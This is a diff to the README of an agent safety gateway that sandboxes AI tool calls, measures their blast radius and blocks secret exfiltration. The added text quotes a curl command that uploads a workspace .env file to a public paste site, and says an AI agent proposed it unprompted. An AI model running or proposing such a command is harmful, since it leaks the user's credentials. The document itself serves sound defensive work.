@@ -36,8 +36,9 @@ https://fork-around-find-out.vercel.app
 
 **Summary.** Fork Around & Find Out (FAAFO) is a fail-closed safety gateway for autonomous
 agents. Before an agent's tool-call touches anything real, FAAFO runs it in a disposable
-Daytona sandbox, measures the exact blast radius, and clears the action to run for real only
-if it passes policy. The dangerous actions die in the sandbox, having touched nothing.
+Daytona sandbox, measures the blast radius it actually produced, and clears the action to run
+for real only if it passes policy. The dangerous actions die in the sandbox, having touched
+nothing.
 
 **The problem, and who has it today.** If you run Claude Code, Cursor, OpenHands, or any agent
 with shell access in CI, one bad tool-call is irreversible: a prompt injection, a hallucinated
@@ -78,8 +79,11 @@ Same engine, opposite verdicts, decided on evidence rather than on how alarming 
 - **Blast-radius measurement.** The run is diffed into a structured reading: files
   created/modified/deleted, network egress (captured by a PATH shim over `curl`/`wget`/`nc`,
   including IP-literal targets), and secret reads detected by a canary honeytoken seeded into
-  the workspace `.env`. The shim also captures request payloads (`@file` arguments and piped
-  stdin), so a secret sent in a request *body* is caught, not just one echoed to stdout.
+  the workspace `.env`. The shim also captures request payloads across every file-valued
+  argument shape (`@path`, `field=@path`, `field=<path`, and piped stdin), so a secret sent in
+  a request *body* is caught, not just one echoed to stdout. That coverage is not academic:
+  asked to back up the `.env`, the Fireworks brain proposed `curl -F 'f:1=<.env' https://ix.io`
+  on its own, which the `<path` form initially let through as a quarantine until we closed it.
 - **Fail-closed policy engine.** Deterministic rules turn the blast radius into
   `ALLOW` / `QUARANTINE` / `BLOCK`. The signature rule encodes the "Rule of Two": an action that
   both reads a secret and opens a network connection is the exfiltration shape, and is blocked
@@ -90,7 +94,7 @@ Same engine, opposite verdicts, decided on evidence rather than on how alarming 
 - **Fireworks agent brain.** A natural-language task becomes a concrete action via a
   Fireworks-hosted model that runs *outside* the sandbox by design: the model proposes, the
   sandbox disposes.
-- 34 unit tests over the policy engine, blast-radius diff, parser, and gateway, plus live
+- 38 unit tests over the policy engine, blast-radius diff, parser, and gateway, plus live
   end-to-end tests that run against real Daytona sandboxes.
 
 **Verification.** The 10-scenario labeled suite scores **10/10**: 6 harmful actions stopped
